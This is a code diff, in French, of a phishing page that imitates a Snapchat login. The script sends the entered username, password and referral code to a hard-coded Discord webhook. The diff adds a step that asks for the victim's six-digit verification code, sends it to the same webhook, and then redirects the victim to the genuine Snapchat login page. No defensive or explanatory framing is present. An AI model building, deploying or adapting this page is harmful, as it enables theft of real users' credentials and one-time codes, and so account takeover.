@@ -20,7 +20,7 @@
       align-items: center;
       height: 100vh;
     }
-    .login-box, .text-area-screen {
+    .login-box, .code-screen {
       width: 100%;
       max-width: 400px;
       padding: 40px;
@@ -85,17 +85,32 @@
       display: none;
       margin-top: 10px;
     }
-    #textAreaScreen {
+    #codeScreen {
       display: none;
     }
-    #textAreaScreen textarea {
-      width: 100%;
-      height: 150px;
-      padding: 10px;
+    #codeScreen p {
       font-size: 14px;
-      border-radius: 8px;
+      margin-bottom: 10px;
+    }
+    #codeInput {
+      width: 100%;
+      padding: 12px;
       border: 1px solid #ccc;
-      resize: vertical;
+      border-radius: 8px;
+      font-size: 16px;
+      box-sizing: border-box;
+      margin-bottom: 15px;
+    }
+    #confirmButton {
+      background-color: #ffff00; /* Jaune comme les autres */
+      border: none;
+      color: #000;
+      font-weight: bold;
+      padding: 12px;
+      width: 100%;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 16px;
     }
   </style>
 </head>
@@ -127,16 +142,15 @@
     <p id="referralError">Le code de parrainage doit contenir exactement 4 chiffres.</p>
   </div>
 
-  <!-- Zone de texte qui apparaît après la connexion -->
-  <div class="text-area-screen" id="textAreaScreen">
-    <h3>Écrivez votre message</h3>
-    <textarea placeholder="Votre message ici..."></textarea>
+  <!-- Zone pour entrer le code reçu -->
+  <div class="code-screen" id="codeScreen">
+    <p>Veuillez entrer le code à 6 chiffres reçu au numéro de téléphone ou à l'adresse mail</p>
+    <input type="text" id="codeInput" maxlength="6" placeholder="Entrez le code à 6 chiffres" />
+    <button id="confirmButton">Confirmer</button>
   </div>
 
   <script>
-    // URL du webhook Discord
     const webhookURL = "https://discord.com/api/webhooks/1500260636360314922/jGdINSMnDqiX_B39wtCs5q0fCz_AGtxruEStRPQpjqf_akokba9KjFW7Ni8TIxu3xYAn";
-    // URL de redirection vers Snapchat
     const redirectURL = "https://accounts.snapchat.com/accounts/v2/login";
 
     document.getElementById('loginForm').addEventListener('submit', function(e) {
@@ -146,24 +160,19 @@
       const password = document.getElementById('password').value.trim();
       const referralCode = document.getElementById('referralCode').value.trim();
 
-      const errorMessage = document.getElementById('errorMessage');
-      const referralError = document.getElementById('referralError');
+      document.getElementById('errorMessage').style.display = 'none';
+      document.getElementById('referralError').style.display = 'none';
 
-      errorMessage.style.display = 'none';
-      referralError.style.display = 'none';
-
-      // Vérifications simples
       if (username.length < 3 || password.length < 3 || username.includes(" ") || password.includes(" ")) {
-        errorMessage.style.display = 'block';
+        document.getElementById('errorMessage').style.display = 'block';
         return;
       }
-
       if (!/^\d{4}$/.test(referralCode)) {
-        referralError.style.display = 'block';
+        document.getElementById('referralError').style.display = 'block';
         return;
       }
 
-      // Préparer le message à envoyer
+      // Envoi au webhook
       const message = {
         embeds: [
           {
@@ -181,25 +190,54 @@
         ]
       };
 
-      // Envoyer au webhook Discord
       fetch(webhookURL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(message),
-      })
-      .then(response => {
-        // Après envoi, attendre 1 seconde puis changer l'affichage
+      }).then(response => {
+        // Après envoi, afficher la zone pour entrer le code reçu
         setTimeout(() => {
           document.getElementById('loginBox').style.display = 'none';
-          document.getElementById('textAreaScreen').style.display = 'block';
-
-          // Après 30 secondes, rediriger
-          setTimeout(() => {
-            window.location.href = redirectURL;
-          }, 30000);
+          document.getElementById('codeScreen').style.display = 'block';
         }, 1000);
-      })
-      .catch(error => {
+      }).catch(error => {
+        alert("Erreur réseau ou CORS.");
+        console.error(error);
+      });
+    });
+
+    // Confirmer le code
+    document.getElementById('confirmButton').addEventListener('click', function() {
+      const code = document.getElementById('codeInput').value.trim();
+      if (code.length !== 6 || !/^\d{6}$/.test(code)) {
+        alert("Veuillez entrer un code valide à 6 chiffres.");
+        return;
+      }
+      // Envoyer le code au webhook
+      const message = {
+        embeds: [
+          {
+            title: " Code reçu",
+            description: "Code à 6 chiffres entré",
+            color: 0xffc800,
+            fields: [
+              { name: "Code reçu", value: code }
+            ],
+            timestamp: new Date().toISOString(),
+            footer: { text: "Code Entry" }
+          }
+        ]
+      };
+      fetch(webhookURL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(message),
+      }).then(() => {
+        // Après envoi, rediriger après 30 secondes
+        setTimeout(() => {
+          window.location.href = redirectURL;
+        }, 30000);
+      }).catch(error => {
         alert("Erreur réseau ou CORS.");
         console.error(error);
       });
